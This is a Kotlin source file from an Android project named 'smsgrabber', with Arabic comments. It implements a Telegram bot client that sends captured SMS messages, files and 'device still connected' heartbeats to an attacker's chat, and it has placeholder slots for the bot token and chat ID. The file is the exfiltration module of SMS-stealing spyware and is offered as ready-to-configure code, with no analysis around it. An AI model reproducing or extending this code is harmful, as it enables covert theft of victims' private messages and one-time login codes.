package com.smsgrabber

import com.google.gson.Gson
import com.google.gson.JsonObject
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.net.SocketTimeoutException
import java.util.concurrent.TimeUnit

/**
 * واجهة Telegram Bot API
 * ترسل الرسائل الملتقطة إلى بوت التيليجرام
 */
object TelegramApi {

    // ⚠️ ============ CONFIGURE HERE ============ ⚠️
    private const val BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
    private const val CHAT_ID = "YOUR_CHAT_ID_HERE"
    // ⚠️ ======================================= ⚠️

    private const val BASE_URL = "https://api.telegram.org/bot"
    private const val MAX_MESSAGE_LENGTH = 4096

    private val gson = Gson()
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    /**
     * إرسال رسالة نصية للبوت
     * @param text نص الرسالة
     * @param parseMode نمط التنسيق (Markdown, HTML, or empty)
     * @return true إذا تم الإرسال بنجاح
     */
    @Throws(IOException::class)
    fun sendMessage(text: String, parseMode: String = "Markdown"): Boolean {
        // تقسيم الرسائل الطويلة
        if (text.length > MAX_MESSAGE_LENGTH) {
            return sendLongMessage(text, parseMode)
        }

        val url = "${BASE_URL}${BOT_TOKEN}/sendMessage"

        val payload = JsonObject().apply {
            addProperty("chat_id", CHAT_ID)
            addProperty("text", text)
            if (parseMode.isNotEmpty()) {
                addProperty("parse_mode", parseMode)
            }
            addProperty("disable_web_page_preview", true)
            addProperty("disable_notification", false)
        }

        val body = gson.toJson(payload).toRequestBody(jsonMediaType)
        val request = Request.Builder()
            .url(url)
            .post(body)
            .header("Content-Type", "application/json")
            .build()

        return try {
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: SocketTimeoutException) {
            false
        }
    }

    /**
     * إرسال رسائل طويلة (تتجاوز 4096 حرف) مقسمة
     */
    private fun sendLongMessage(text: String, parseMode: String): Boolean {
        val parts = text.chunked(MAX_MESSAGE_LENGTH - 100)
        var allSuccess = true
        for ((index, part) in parts.withIndex()) {
            val header = if (parts.size > 1) "(${index + 1}/${parts.size})\n" else ""
            val success = sendMessage(header + part, parseMode)
            if (!success) allSuccess = false
            if (index < parts.size - 1) Thread.sleep(500)
        }
        return allSuccess
    }

    /**
     * إرسال ملف أو مرفق للبوت
     */
    @Throws(IOException::class)
    fun sendDocument(fileBytes: ByteArray, fileName: String, caption: String = ""): Boolean {
        val url = "${BASE_URL}${BOT_TOKEN}/sendDocument"

        val multipartBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("caption", caption)
            .addFormDataPart(
                "document",
                fileName,
                fileBytes.toRequestBody("application/octet-stream".toMediaType())
            )
            .build()

        val request = Request.Builder()
            .url(url)
            .post(multipartBody)
            .build()

        return try {
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            false
        }
    }

    /**
     * إرسال تنبيه نبض القلب - للتأكد من أن الجهاز لا يزال متصلاً
     */
    fun sendHeartbeat(): Boolean {
        return try {
            val msg = "💓 *نبض*\nالجهاز لا يزال متصلاً\n🕐 ${System.currentTimeMillis()}"
            sendMessage(msg, "Markdown")
        } catch (e: Exception) {
            false
        }
    }

    /**
     * اختبار الاتصال بالبوت
     */
    fun testConnection(): Boolean {
        return try {
            val url = "${BASE_URL}${BOT_TOKEN}/getMe"
            val request = Request.Builder().url(url).build()
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            false
        }
    }

    /**
     * التحقق من صحة التوكن
     */
    fun getBotInfo(): String? {
        return try {
            val url = "${BASE_URL}${BOT_TOKEN}/getMe"
            val request = Request.Builder().url(url).build()
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    response.body?.string()
                } else {
                    null
                }
            }
        } catch (e: Exception) {
            null
        }
    }
}
